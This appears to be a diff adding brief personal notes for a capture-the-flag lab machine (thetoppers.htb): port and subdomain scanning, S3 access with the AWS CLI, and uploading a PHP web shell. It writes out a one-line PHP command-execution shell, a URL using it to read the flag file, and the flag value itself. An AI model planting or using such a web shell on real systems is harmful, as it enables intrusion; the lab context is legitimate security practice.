@@ -1,0 +1,12 @@
+scan ports
+look for domain
+add dns records in /etc/hosts
+scan subdomain with gobuster
+add dns records
+lookup s3
+install aws cli
+configure
+upload php injection
+<?php system($_GET['cmd']); ?>
+http://thetoppers.htb/shell3.php?cmd=cat%20../flag.txt
+a980d99281a28d638ac68b9bf9453c2b
